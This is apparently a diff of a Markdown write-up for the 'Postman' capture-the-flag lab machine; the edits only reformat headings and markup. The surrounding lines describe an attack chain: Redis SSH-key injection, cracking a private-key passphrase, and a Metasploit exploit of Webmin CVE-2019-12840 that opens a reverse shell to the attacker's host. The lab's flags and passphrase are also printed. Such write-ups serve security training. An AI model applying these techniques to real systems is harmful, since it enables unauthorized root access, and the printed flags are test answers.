@@ -8,12 +8,9 @@
 | **Release Date**     | November 2019 |
 | **Difficulty**       | Easy          |
 
----
 # Machine Description
 
 Postman is an Easy-level Linux machine that demonstrates the risks of insecure default configurations in popular services. The machine features an open Redis instance with anonymous access, an outdated Webmin installation vulnerable to authenticated remote code execution, and weak credential management practices. The exploitation chain progresses from leveraging Redis to inject SSH keys, cracking encrypted private keys, and finally exploiting a known vulnerability in Webmin to achieve root access.
-
----
 
 # Exploitation Summary
 
@@ -28,13 +25,11 @@ The attack chain involved:
 7. **CVE-2019-12840 Exploitation**: Exploiting a package upload vulnerability in Webmin 1.910 to achieve remote code execution as root
 8. **Root Access**: Executing commands as the root user and retrieving the root flag
 
----
-
 # Detailed Walkthrough
 
 ## Road to User Flag
 
-##### ***Phase 1: Initial Reconnaissance and Service Discovery***
+### ***Phase 1: Initial Reconnaissance and Service Discovery***
 
 I began by scanning the target machine with Nmap to identify open ports and running services:
 
@@ -63,7 +58,7 @@ $ nmap 10.129.2.1 -Pn -p- --open -T5
 
 ...SNIP...
 ```
-##### ***Phase 2: Web Application Analysis***
+### ***Phase 2: Web Application Analysis***
 
 I accessed the Webmin interface on port 10000 and discovered a login form requiring username and password credentials. 
 
@@ -81,7 +76,7 @@ sqlmap -r req.txt
 
 However, the testing revealed that the login form parameters were not vulnerable to SQL injection techniques. This necessitated exploring alternative attack vectors.
 
-##### ***Phase 3: Redis Service Exploitation***
+### ***Phase 3: Redis Service Exploitation***
 
 With the Webmin login remaining inaccessible through direct exploitation, I shifted focus to the Redis service discovered on port 6379. Redis is a popular in-memory data store, but when improperly configured without authentication, it can become a critical security vulnerability. I connected to the Redis instance to verify anonymous access:
 
@@ -122,7 +117,7 @@ OK
 
 The `save` command persisted the Redis database to disk. The RDB format would include the SSH key data I had stored, effectively writing my public key to `/var/lib/redis/.ssh/authorized_keys`. Although RDB files contain binary data and formatting overhead, the newlines surrounding my public key data ensured that the key remained in a parseable format within the file.
 
-##### ***Phase 4: SSH Access as Redis User***
+### ***Phase 4: SSH Access as Redis User***
 
 With the public key now present in the `redis` user's home directory, I attempted to authenticate via SSH using the corresponding private key:
 
@@ -137,7 +132,7 @@ redis@Postman:~$ id
 uid=107(redis) gid=114(redis) groups=114(redis)
 ```
 
-##### ***Phase 5: Reconnaissance and Private Key Discovery***
+### ***Phase 5: Reconnaissance and Private Key Discovery***
 
 From my position as the redis user, I began enumerating the system to identify paths for privilege escalation. I searched for other users on the system:
 
@@ -184,7 +179,7 @@ DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
 -----END RSA PRIVATE KEY-----
 ```
 
-##### ***Phase 6: SSH Key Passphrase Cracking***
+### ***Phase 6: SSH Key Passphrase Cracking***
 
 To crack the passphrase protecting the private key, I transferred the key to my attack machine and converted it to a hashable format using `ssh2john`:
 
@@ -206,7 +201,7 @@ computer2008     (Matt_id_rsa.txt)
 
 The cracking process succeeded rapidly, revealing the passphrase `computer2008`
 
-##### ***Phase 7: Lateral Movement to Matt User***
+### ***Phase 7: Lateral Movement to Matt User***
 
 After obtaining the passphrase to use the private key, I attempted to access the SSH service as Matt, but the server blocked the connection. So, I leveraged the cracked passphrase to switch user context directly on the target system. From my redis shell, I executed the su command with username `Matt` and password `computer2008`:
 
@@ -220,17 +215,17 @@ After successful authentication, I navigated to `Matt`'s home directory and retr
 Matt@Postman:~$ cat /home/Matt/user.txt
 ```
 
-==User flag==: `c7796dd40102f7f0a01935d1868260d6`
+<mark>User flag</mark>: `c7796dd40102f7f0a01935d1868260d6`
 
 ## Road to Root Flag
 
-##### ***Phase 1: Webmin Authentication***
+### ***Phase 1: Webmin Authentication***
 
 Having obtained valid credentials (`Matt: computer2008`), I attempted to authenticate to the Webmin interface on port 10000. Webmin presented a login form, and I entered the discovered credentials. The authentication succeeded, granting me access to the Webmin administrative dashboard. This represented a significant privilege escalation opportunity, as Webmin runs with elevated privileges and interacts directly with system configuration.
 
 ![[Pasted image 20261004131413.png]]
 
-##### ***Phase 2: Webmin vulnerable version
+### ***Phase 2: Webmin vulnerable version
 
 Upon accessing Webmin, I noted the version displayed as 1.910. This version is known to be vulnerable to CVE-2019-12840, a package upload vulnerability that permits remote code execution. The vulnerability exists in the package management module, specifically in the processing of uploaded packages. I configured the Metasploit framework to exploit this vulnerability:
 
@@ -263,7 +258,7 @@ The exploit successfully retrieved the session cookie and initiated the payload 
 [*] Command shell session 1 opened (10.10.14.102:4444 -> 10.129.2.1:51642)
 ```
 
-##### ***Phase 3: Get the flag***
+### ***Phase 3: Get the flag***
 
 Upon successful exploitation, I obtained a shell with root privileges:
 
@@ -283,9 +278,7 @@ locate root.txt
 cat /root/root.txt
 ```
 
-==Root flag==: `af4b49fe6ba1972f5964b5d657b6557f`
-
----
+<mark>Root flag</mark>: `af4b49fe6ba1972f5964b5d657b6557f`
 
 # Key Vulnerabilities Exploited
 
@@ -296,7 +289,6 @@ cat /root/root.txt
 - **Webmin CVE-2019-12840**: Webmin 1.910 contains a package upload vulnerability that permits authenticated remote code execution. An attacker with valid credentials can upload a malicious package that executes arbitrary commands with Webmin's privileges (typically root).
 - **Outdated Software Version**: The Webmin installation had not been updated from version 1.910, released in 2019. This outdated version lacked security patches for known vulnerabilities.
 
----
 
 # Conclusion
 
